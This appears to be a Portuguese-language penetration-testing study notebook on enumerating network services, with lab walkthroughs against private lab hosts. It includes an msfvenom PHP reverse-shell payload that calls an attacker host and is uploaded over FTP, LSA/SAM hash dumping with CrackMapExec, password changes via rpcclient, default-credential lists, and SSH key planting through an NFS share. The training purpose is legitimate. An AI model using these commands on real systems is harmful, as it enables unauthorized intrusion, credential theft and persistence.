
# Enumeration

## Introdução

Nesse módulo temos como principal objetivo enumerar uma série de serviços presentes na maioria dos ambientes focando nos seguintes tópicos:

1. Identificar detalhes dos serviços alvo
2. Bater versões com exploits
3. Coletas + informações sobre serviços suscetíveis a ataque força bruta

## Processo Padrão

1. Identificar detalhes do serviço
2. Estudar o funcionamento do serviço
3. Tentar interagir com os serviço/capturar banner
4. Identificar Vulnerabilidades

--- 


# Enumerando HTTP

Abaixo está o processo padrão de enumeração para o serviço HTTP

### O que buscar em um HTTP?

- Versões do WebServer
- Versões da linguagem utilizada para página
- Versões para tecnologias usadas (PHP,ASP)
- Métodos aceitos

### Como realizar a busca?

- Buscar por portas abertas: 80,8080,81,8181
- Buscar versões do HTTP: `/ HTTP/1.0` ou `/ HTTP/1.1`
- Realizar conexão e testar métodos: `GET , HEAD , OPTIONS`

### Exemplo:

```bash
nc -v <site> 80
HEAD / HTTP/1.1
Host: <site>  --> 1.1 solicita host
OPTIONS
GET /index.aspx HTTP/1.1
```

***Ponto de atenção:**

- `HEAD / HTTP/1.0`: Pega header da página
- `GET / HTTP/1.0` : Pega toda a página


---

# Enumerando HTTPS (80)

Em relação ao HTTPS basicamente todo o falado para HTTP é válido com algumas diferenças sutis que temos que ter cuidado com HTTPS.

***Ponto de atenção:** Precisamos utilizar openssl para realizar conexões com o HTTPS, pois ele comporta a verificação de certificado

`openssl s_client -connect <site>:<porta>`

Porta padrão 443

Fazendo requisições dessa forma podemos aplicar as lógicas citadas no HTTP para o HTTPS sem problemas.

*Ponto de atenção 2:

- Requisições devem ser feitas sempre com HTTP/1.1 e Host: `<site>`
- Caso ao fazer a requisição você seja redirecionado a outro site refaça o processo para o novo site.
---



# Identificando FW WEB (WAF)

Para identificarmos um firewall WEB utilizaremos a seguinte aplicação:

- `wafw00f` : Faz identificações de firewall na camada WEB de forma automatizada

EX: `wafw00f <site>`

---





# Enumerando FTP (21)

A seguir temos o passo a passo indicado para realizar a enumeração do serviço FTP, muitos ambiente utilizam o FTP para compartilhamento de arquivos o que torna essa verificação imprescindível.

### Passo a passo

1. Faça uma busca nas portas do alvo focando nas portas de FTP ou com banner do serviço FTP
    
    Portas :21 e 2121
    
2. Busque o banner do serviço para revisar a versão da aplicação FTP usada
    
3. Teste o acesso com senhas e usuários padrão utilizando os seguintes comandos:
    
    1. `USER <user>`
    2. `PASS <password>`
    3. Via 1 comando caso queira - `ftp user:senha@<ip>`
4. Muitas vezes a senha ou usuários do FTP pode ser `ftp`ou `anonymous`pois esses são usuários muitas vezes deixados pelos admins no sistema, vale a pena testar acesso com essas credenciais. —> Vale usar o nome da `empresa`, ou do `user` também
    

- Extra: O comando `passive`também pode liberar a entrada para observação de dirs caso o acesso passivo esteja habilitado no sistema.
- Em ultimo caso precisa ser considerado um bruteforce com `hydra`

** Vale muito a pena tentar pegar acesso para enviar arquivos maliciosos **

EX:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.23.10.193 LPORT=4646 -f raw -o 150.php
proxychains4 ftp webmaster@10.10.150.10 60021

ls
cd site

#Mandando arquivo
send /home/mytmsh/SecurePharma/150.php 150.php
```




----





# Enumerando NetBIOS / SMB (139,445)

Os protocolos NetBIOS / SMB muitas vezes são utilizados para **compartilhamento de arquivos** em ambientes empresariais. Dessa forma sempre vale a pena revisar se essas aplicações estão rodando e podem ser exploradas de alguma forma.

**Portas: 139 e 445**

**Método `Null Session` —>** Acesso a aplicação utilizando credenciais nulas

**`IPC$` —>** Permite que usuários anônimos executem certas atividades

## NetBIOS / SMB para Windows

- `nbtstat` : Permite varredura na rede Windows em que o host está
    - `-A` : Busca por IP
    - `-a` : Busca por hostname
    - `-c` : Mostra as máquinas que o host sendo utilizado já se comunicou
- `net view` : Mostra infos de uma máquina acessível, e pastas que ela está compartilhando
    - `new view \\\\<ip>`
- `net use` : Faz requisição de arquivo a outra máquina
    - `net use \\\\<ipremoto>\\diretório “senha” /u:<usuário>`
- **`Null Session` para Windows**
    - `net use \\\\<ip> “” u:””`
    - `net use`
    - `net view \\\\<ip>`
- Vale revisar bruteforce pra esse caso?

## NetBIOS / SMB para Linux

- `nmblookup -r <subnet/mask>` : Lista hosts na rede que estão disponíveis para conexão netbios ou SMB
    
- `nbtscan -v <IP>` : Aprofunda infos do host analisado
    
- `smbclient -L \\\\<IP>` : Conecta no host e trás informações (diretórios, detalhes e +)
    
    - `-U` : Permite passar user
        - `-U <user>%<senha>`
    - `-N` : Passa conexão sem senha
- `smbclient //<ip>/diretório` : Baixa arquivo compartilhado por NetBIOS ou SMB
    
    - `GET` : Comando a se passar após conectar
- `—options=”client min protocol=NT1”` : Comando a ser posto no final caso seja necessário
    
    - `smbclient [//172.16.1.4/_DOCS](<https://172.16.1.4/_DOCS>) --option='client min protocol=NT1' -N -U "SMB"` —> Sempre teste
    - ou `--option='client min protocol=SMB2' --option='client max protocol=SMB3'`
    
    uma versão mais antiga
    
    ***Sempre fazer pra toda a rede**
    
    *SMBv1 kkkk ETERNALBLUE
    

Ferramenta para automatizar verificações: **`enum4linux ou crackmapexec`**

→ Reis de pegar infos e hashes ←

EX:

- `crackmapexec smb 172.16.2.243.txt -d ORIONSCORP -u Administrador -p 'admin123' --lsa` : Pega hashes do LSA, vc pode usar `—sam` tmb
- `enum4linux <IP>` **(PRA 139)**

## Crackmapexec

```bash
# Listar usuários locais
crackmapexec smb 172.23.1.139 --users

# Listar grupos
crackmapexec smb 172.23.1.139 --groups

# Listar usuários logados
crackmapexec smb 172.23.1.139 --loggedon-users

# Listar sessões
crackmapexec smb 172.23.1.139 --sessions

# Listar shares
crackmapexec smb 172.23.1.139 --shares

# Listar shares com usuário
crackmapexec smb 172.23.1.139 -u 'usuario' -p 'senha' --shares

# Listar shares com null session
crackmapexec smb 172.23.1.139 -u '' -p '' --shares
```




----





# Enumerando RPC (135)

Protocolo utilizado para execução de processos e comandos remotos para máquinas do ambiente. Precisamos revisar ele pois muitas vezes ele apresenta vulnerabilidades que podem ser muito úteis para exploração.

- `rpcclient` : Similar ao que já vimos para SMB, podemos explorar o Null Session aqui e com comandos certos pode trazer infos do host
    
    Comandos:
    
    - `?` : Lista comandos
    - `enumdomusers` : Lista users
    - `queryuser <user>` : Informações do user
    - `netshareenum` : enumeração dos compartilhamentos
- `rpcclient -u “<user:” <ip>` : Conexão usando user específico
    
- `setuserinfo2 <USER> 23 '<SENHA>’` : Muda senha de user
    
- `rpcclient -U "" -N 172.23.1.139` : Null session
    


---






# Enumerando POP3 (110)

POP3 é um serviço utilizado para troca de e-mails dentro de um ambiente, geralmente utiliza a porta 110 para conexões.

### Passo a passo para enumeração do POP3

1. Conecte-se via Netcat
2. Use os comandos PASS e USER para tentar se autenticar com admin (caso você tenha usuários ou senhas tente também)
3. Feito o login utilize os seguintes itens para explorar
    1. `STAT` : Mostra status
    2. `LIST` : Mostra mensagens
    3. RETR<1, 2 ,…> : Lê mensagem em específico



---






# Enumerando SMTP (25)

SMTP é outro protocolo de e-mails que revisaremos que pode muitas vezes apresentar vulnerabilidades exploráveis no ambiente. Situado muitas vezes na porta 25 a seguir está o passo a passo para validar esse serviço

### Passo a passo (Enumeração)

1. Listar serviço cia NMAP e realizar conexão com netcat para buscar banner e validar versões
    
2. Uma vez conectado testar os seguintes comandos:
    
    1. `EHLO <user>` : Identifica host
    2. `VRFY <user>` : Reporta que o usuário existe no serviço de e-mail
    3. `HELP` : Explica comandos possíveis para a aplicação
3. Realiza o teste de enviar um e-mail malicioso pra dentro da rede
    
    1. `mail from: <user>`
    2. `rcpt from: <user 2 >`
    3. `data` : Entra no modo de mensagem
    4. Escreva as mensagens desejadas
    
    VALE A PENA FAZER SCRIPT PRA ISSO?



---






# Enumeração Telnet (23)

> Devices com telnet na rede podem levar a devices de gerência do ambiente

O que fazer quando achar um telnet?

SEMPRE testar as senhas padrões (admin, root e etc)

Sites que contém senhas padrões de equipamentos:

- [cirt.net](https://cirt.net/)
- [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)


---



# Enumerando SSH (22)

### Passo a passo para enumeração SSH

1. Descubra via NMAP o host com SSH em alguma porta (Geralmente portas 22,2222)
2. Realize um banner grabbing e busque versões
3. Identifique os métodos de autenticação com `ssh -v <IP>`

![image.png](attachment:87cc15ce-0eaa-498f-8784-65eda9f30f0a:image.png)

*Ponto importante: `/etc/.ssh/knowhosts` —> Arquivo que contém hosts conhecidos do SSH

## Realizando autenticação no SSH com chave pública

Diretórios interessantes:

- `/<user>/.ssh/authenticatedkeys` : Onde ficam as chaves públicas autenticadas pelo server para se conectar via user
    
    ***Variante**: `/home/<user>/.ssh/authenticatedkeys`
    
- `/etc/ssh/sshd_config` : Arquivo de configurações do SSH
    

Passo a passo para configuração:

1. Gere a chave PUB e RSA via o seu PC (Windows ou Linux) com o seguinte comando
    
    `ssh-keygen` : 1 arquivo .pub outro sem extensão
    
    Coloque senha para quebra da criptografia
    
    Coloque o diretório onde as chaves serão salvas
    
2. Pegue a chave PUB gerada e envie para o diretório authenticatedkeys do server onde nos conectaremos
    
3. Agora no host que você está usando utilize o seguinte comando:
    
    `ssh-add <chave RSA>` E instale a chave RSA no seu pc
    
    *Importante citar que muitas vezes o usuário pode não ter a pasta .ssh criada, nesses casos precisamos criar manualmente para que funcione as configs

---






# Enumerando NFS (2049)

Porta utilizada: 2049

O NFS é um serviço muito utilizado para compartilhamento de arquivos na rede, e vale a pena revisar se não podemos encontrar vulnerabilidades nele

### Passo a passo

1. Checkar versão do NFS realizando a conexão via netcat com ele ou
    
    `rpcinfo -p <IP do host> | grep nfs`
    
2. Checkar arquivos sendo compartilhados na rede
    
    `showmount -e <IP do host>`
    
    Caso esteja sendo passado o root podemos remontar uma máquina inteira basicamente com o IP do host
    
3. Realizar a tentativa de montar arquivos compartilhados em um diretório da sua máquina
    
    `mount -t nfs -o nfsvers=<versão do nfs> <ip do alvo>:<diretório alvo> <diretório onde montaremos esses arquivos>`
    
    Ou
    
    `sudo mount -t nfs -o vers=3 <IP>:<Dir remoto <Dir da sua máquina>`
    


---




# Enumerando SNMP (161)

Primeiramente antes de iniciarmos essa enumeração é interessante saber alguns conceitos básicos sobre o SNMP, são eles:

- **OID** : Identificador de objetos a serem monitorados
- **MIB** : Base com informações dos objetos a serem monitorados
- **Community** : Senha do SNMP para troca de informações entre hosts

**Ponto de atenção : Porta do SNMP é 161 UDP**

[www.oid.info.com](http://www.oid.info.com) : Site que tem as explicações dos OIDs

### Aplicações a serem usadas

- `onesixtyone` : Programa que varre hosts com SNMP na rede
    
    - `onesixtyone <ip/mask>`
    - `onesixtyone -c <community> <ip/mask>`
    
    Nesse caso é muito importante que você defina a community a ser usada e caso não saiba, faça uma automação para testar as communities e identificar qual é ela, communities padrões são public e private
    
    **/usr/share/wordlists/metasploit/ —> Wordlists pra achar communities**
    
    Ou crie um arquivo com todas elas e passe após o -c
    
    Communities usadas:
    
    ```bash
    public
    private
    secret
    cisco
    snmp
    manager
    juniper
    ```
    
- `snmpwalk` : Comando utilizado para simular uma requisição utilizada para monitoramento
    
    - `snmpwalk -c <community> -v<versão> <IP alvo> <OID>`
    
    **Aqui se você não passar o OID ele testa todos, mt bom!**
    
- `snmptranslate` : Utilizado para descobrir baseado em OID ou em parte do nome o nome completo de um uma trigger OID
    
    - `snmptranslate -IR sysuptime`
        
    - `snmptranslate -Td SNMPv2-MIB:sysUpTime`
        
        -Td : Passa mais detalhes sobre o OID
        

### Alterando informações do SNMP

*É necessário para essa sessão que as communities tenham opção de escrita no SNMP

**Comandos utilizados par alteração**

- **snmpcheck** : Tenta enumerar SNMP de um host
    - `snmp-check <IP> -c <community>`
- **snmpset** : Altera o parâmetro de um item especifico no SNMP de um host alvo
    - `snmpset -c <community> -v<versão> <parâmetro> s “<conteúdo>`
        
        Perceba que acima o `s` é de string, caso o valor de conteúdo fosse integer por exemplo usaríamos `i` por exemplo
        



----





# Enumerando MySQL (3306)

Porta do MySQL —> **`3306`**

Para o caso do MySQL sempre vale a pena revisar se o usuário root não foi deixado ativo no sistema.

User: mysql

Senha: mysql

Ou teste com

User: root

Senha: Sem senha

### Passo a passo

1. Realize a tentativa de conexão da porta do mysql
    1. `mysql -h <IP> -u <user> -p`
2. Passe a senha quando for solicitado
3. Caso obtenha sucesso na autenticação teste os seguintes comandos
    1. `show databases;`
    2. `show tables;`
4. Caso você visualize tabelas e queria entrar em uma use o comando `use <tabela>;`
5. Para buscar as infos da tabela em que você está use o comando `show tables;`
6. Para buscar todas as linhas em uma table use o comando `SELECT * FROM <table>;`

`PONTO DE ATENÇÃO`: Dentro da database `mysql,` pode ter uma tabela user com a coluna `authentication_string` —> Aqui pode ter users e senhas de autenticação no mysql



---



# Enumerando DNS (53)

## **`Consulte a pagina Information Gathering Infra e use DIG`**



----







# LABS

Mecanismos de defesa

1. Qual versão do serviço?
    
    nc -v [intranet.businesscorp.com.br](http://intranet.businesscorp.com.br/) 80
    
    HEAD / HTTP/1.0 —> ele retorna a versão
    

Enumeration

LAB 1

`sudo nmap -v -sSV -p 3306 172.16.1.0/24`

LAB 2

`mysql -h 172.16.1.33 -u root`

`LAB 3`

`mysql -h 172.16.1.33 -u root`

`show databases;`

`show tables;`

`use vlab`

`SELECT * FROM ativa;`

LAB4

`ssh -v 172.16.1.33`

LAB NFS

`rpcinfo -p 172.16.1.31 | grep nfs` : Verificar versões do NFS

`showmount -e 172.16.1.31` : Quais dirs o host oferece

`sudo mount -t nfs -o vers=3 172.16.1.31:/home/camila /home/mytmsh/ENUM`

NFS parte 2 - Esse foi uma pika

lembra que tu ta com o dir conectado no /ENUM a /home/camila

ls -a da pra ver que tem .ssh da camila

cria chave ssh —> `ssh-keygen`

da chmod 600 pra chave rsa que você criou

manda chave publica para o arquivo authenticated keys da camila

`ssh-add <chave privada>` No seu host

Dai entrei no /etc/sshd_config da camila e tive que permite o diretório authenticated keys a ser usado

e tive que dar um comando que aceita as autenticações com outras chaves no SSH

***TEM QUE USAR COMO USER CAMILA**

`sudo ssh -vvv [camila@172.16.1.31](<mailto:camila@172.16.1.31>) -i /root/.ssh/id_rsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedAlgorithms=+ssh-rsa`

No root dela tem a chave

**MUITO FERA - SE DER REFAZER(COM ACESSO A HOME/USER TU ENTRA EM QUALQUER LUGAR)**

NFS3

`rpcinfo -p 172.16.1.31 | grep nfs`

NFS4

`showmount -e 172.16.1.251`

NFS5

`sudo mount -t nfs -o vers=3 172.16.1.251:/opt/comp /home/mytmsh/251N`

LAB FTP

`ftp 172.16.1.31 -p 2121`

`user: anonymous`

`password: anonymous`

`less key.txt`

LAB FTP 1

`sudo nmap -v -sSV -Pn 172.16.1.251`

LAB FTP 2

`ftp 172.16.1.251 -p 2121`

`user: ftp`

`senha usada: ftp`

`pwd`

`ls`

`get key —> e vi o que tem na key no meu linux`

LAB SMB

Comecei pegando as infos com nbtscan

`sudo nbtscan -r 172.16.1.0/24` - Demorei a perceber mas é interessante fazer pra toda a rede

ele informa 4 maquinas, WKS01 sendo o alvo

Rodei o smbclient pra todas e 1 estava vulneravel, mostrando o workgroup do alvo

Eu sabia também que por lógica a key estaria no _DOCS

Então utilizando o usuário que eu sabia que existia por causa do nbtscan fiz um null session com ele para o alvo já entrando no docs

`smbclient [//172.16.1.4/_DOCS](<https://172.16.1.4/_DOCS>) --option='client min protocol=NT1' -N -U "SMB"`

depois foi so salvar a key.txt.txt

`get key.txt.txt`

LAB SNMP

`sudo nmap -v -sUV -p 161 -Pn 172.16.1.4`

`snmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25`

`(Em outros casos seria bom testar outras OID)`

LAB SNMP 2

peguei a wordlist

common_roots.txt

`onesixtyone -c common_roots.txt 172.30.0.103`

LAB SNMP 3

peguei a wordlist

common_roots.txt

`onesixtyone -c common_roots.txt 172.30.0.103`

LAB SNMP 4

`snmpwalk -c Secret -v1 172.30.0.103` pra pegar todas as OIDs

LAB SNMP 5

Descobri que a OID abaixo é sobre storage do windows

`snmpwalk -v2c -c Secret 172.30.0.103 .1.3.6.1.2.1.25.2`

LAB SNMP 6

pesquisei no goolgle : [oidref.com](http://oidref.com/) user accounts

ele retornou a OID 1.3.6.1.4.1.77.1.2.25

`snmpwalk -v2c -c Secret 172.30.0.103 1.3.6.1.4.1.77.1.2.25`


